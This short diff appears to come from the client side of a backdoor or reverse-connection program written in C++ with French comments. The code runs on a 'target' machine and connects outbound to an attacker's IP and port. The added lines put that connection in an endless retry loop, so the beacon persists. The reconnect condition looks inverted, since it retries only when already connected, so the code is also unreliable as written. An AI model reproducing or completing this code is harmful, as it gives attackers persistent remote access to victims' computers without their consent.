@@ -15,6 +15,17 @@ int main(){ // Main client -- cible
     //Loop de connection
     Connexion connexionOUT(adresseipPirate, portPirate, ConnexionType::OUTBOUND);
 
+    while (true)
+    {
+        if (connexionOUT.connected)
+        {
+            while (!connexionOUT.Connect())
+            {
+                Sleep(5);
+            }
+        }
+        Sleep(15000);
+    }
 
     return 0;
 }
